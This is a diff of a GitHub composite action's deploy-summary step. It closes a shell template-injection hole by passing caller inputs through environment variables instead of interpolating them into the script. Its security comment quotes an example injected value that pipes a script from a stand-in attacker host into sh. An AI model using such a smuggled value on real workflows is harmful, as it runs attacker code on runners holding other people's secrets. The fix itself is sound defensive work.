@@ -302,16 +302,35 @@ runs:
       id: summary
       if: always()
       shell: bash
+      # SECURITY: every value below is passed through `env:` and referenced as
+      # "$VAR", never interpolated as `${{ ... }}` inside the script.
+      #
+      # GitHub substitutes a `${{ }}` expression into the script text BEFORE the
+      # shell parses it. `vps_host` and `ref` are caller-supplied, so a value
+      # such as  x"; curl https://evil.example/s | sh; echo "
+      # would close the quote and execute arbitrary commands — on a CONSUMER's
+      # runner, holding THEIR secrets, since this is a public action. Passing
+      # via env makes the shell treat the value as data instead of code.
+      # Enforced by scripts/ci/repo-rules.mjs (repo-rules/shell-template-injection).
+      env:
+        SSH_CONCLUSION: ${{ steps.ssh.conclusion }}
+        START_EPOCH: ${{ steps.now.outputs.start_epoch }}
+        STARTED_AT_ISO: ${{ steps.now.outputs.iso }}
+        DEPLOY_STRATEGY: ${{ inputs.strategy }}
+        DEPLOY_VPS_HOST: ${{ inputs.vps_host }}
+        DEPLOY_REF: ${{ inputs.ref }}
+        DEPLOY_DRY_RUN: ${{ inputs.dry_run }}
       run: |
-        if [ "${{ steps.ssh.conclusion }}" = "success" ]; then
+        set -euo pipefail
+
+        if [ "$SSH_CONCLUSION" = "success" ]; then
           STATUS="success"
         else
           STATUS="failure"
         fi
         echo "deploy_status=$STATUS" >> "$GITHUB_OUTPUT"
         END=$(date +%s)
-        START="${{ steps.now.outputs.start_epoch }}"
-        DURATION=$((END - START))
+        DURATION=$((END - START_EPOCH))
         echo "duration_seconds=$DURATION" >> "$GITHUB_OUTPUT"
 
         {
@@ -320,12 +339,12 @@ runs:
           echo "| Field | Value |"
           echo "|---|---|"
           echo "| **Status** | $STATUS |"
-          echo "| **Strategy** | ${{ inputs.strategy }} |"
-          echo "| **VPS host** | ${{ inputs.vps_host }} |"
-          echo "| **Ref** | ${{ inputs.ref }} |"
-          echo "| **Started (UTC)** | ${{ steps.now.outputs.iso }} |"
+          echo "| **Strategy** | $DEPLOY_STRATEGY |"
+          echo "| **VPS host** | $DEPLOY_VPS_HOST |"
+          echo "| **Ref** | $DEPLOY_REF |"
+          echo "| **Started (UTC)** | $STARTED_AT_ISO |"
           echo "| **Duration** | ${DURATION}s |"
-          echo "| **Dry run** | ${{ inputs.dry_run }} |"
+          echo "| **Dry run** | $DEPLOY_DRY_RUN |"
         } >> "$GITHUB_STEP_SUMMARY"
 
 branding:
